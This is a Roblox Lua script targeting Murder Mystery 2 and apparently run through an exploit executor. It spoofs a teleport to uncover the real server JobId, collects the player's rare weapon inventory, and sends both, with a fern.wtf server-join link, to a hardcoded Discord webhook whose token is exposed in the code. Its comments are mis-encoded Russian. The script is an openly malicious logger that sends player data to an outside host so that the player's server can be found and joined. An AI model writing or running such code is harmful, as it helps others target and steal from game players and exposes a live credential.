local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local placeId = 142823291 -- MM2 placeId
local spoofedJobId = game.JobId
local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö —Ä–µ–¥–∫–æ—Å—Ç–µ–π –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
local MinUnique, MinAncient, MinGodly = 1, 1, 1

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è –∏–≥—Ä–æ–∫–∞
local function getInventory()
    local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
    local uniqueItems, ancientItems, godlyItems = {}, {}, {}
    local counts = {unique=0, ancient=0, godly=0}

    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            if item.Rarity == "Unique" then
                counts.unique = counts.unique + 1
                table.insert(uniqueItems, item.ItemName)
            elseif item.Rarity == "Ancient" then
                counts.ancient = counts.ancient + 1
                table.insert(ancientItems, item.ItemName)
            elseif item.Rarity == "Godly" then
                counts.godly = counts.godly + 1
                table.insert(godlyItems, item.ItemName)
            end
        end
    end

    return counts, uniqueItems, ancientItems, godlyItems
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ webhook
local function sendWebhook(realJobId)
    local counts, uniqueItems, ancientItems, godlyItems = getInventory()

    -- –ü—Ä–æ–≤–µ—Ä–∫–∞, –µ—Å—Ç—å –ª–∏ —á—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å
    if counts.unique >= MinUnique or counts.ancient >= MinAncient or counts.godly >= MinGodly then
        local fernUrl = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
        local webhookData = {
            embeds = {{
                title = "üîç JobID + Inventory Info",
                description = "Captured real JobID and inventory",
                color = 65280,
                fields = {
                    { name = "Spoofed JobID", value = spoofedJobId, inline = true },
                    { name = "Real JobID", value = realJobId, inline = true },
                    { name = "Fern.wtf Join Link", value = fernUrl, inline = false },
                    { name = "Uniques", value = #uniqueItems > 0 and table.concat(uniqueItems, ", ") or "None", inline = false },
                    { name = "Ancients", value = #ancientItems > 0 and table.concat(ancientItems, ", ") or "None", inline = false },
                    { name = "Godlies", value = #godlyItems > 0 and table.concat(godlyItems, ", ") or "None", inline = false },
                },
                footer = { text = "Delta JobID + Inventory Logger" }
            }}
        }

        pcall(function()
            http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(webhookData)
            })
        end)
    end
end

-- –õ–æ–≤–∏–º –Ω–µ—É–¥–∞—á–Ω—ã–π —Ç–µ–ª–µ–ø–æ—Ä—Ç
TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportInfo)
    if teleportInfo and teleportInfo.ServerInstanceId then
        local realJobId = teleportInfo.ServerInstanceId
        print("Real JobId detected:", realJobId)
        sendWebhook(realJobId)
    end
end)

-- –¢—Ä–∏–≥–≥–µ—Ä–∏–º "spoofed" —Ç–µ–ª–µ–ø–æ—Ä—Ç, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å —Ä–µ–∞–ª—å–Ω—ã–π JobId
for i = 1, 2 do
    task.spawn(function()
        pcall(function()
            TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
        end)
    end)
    task.wait()
end
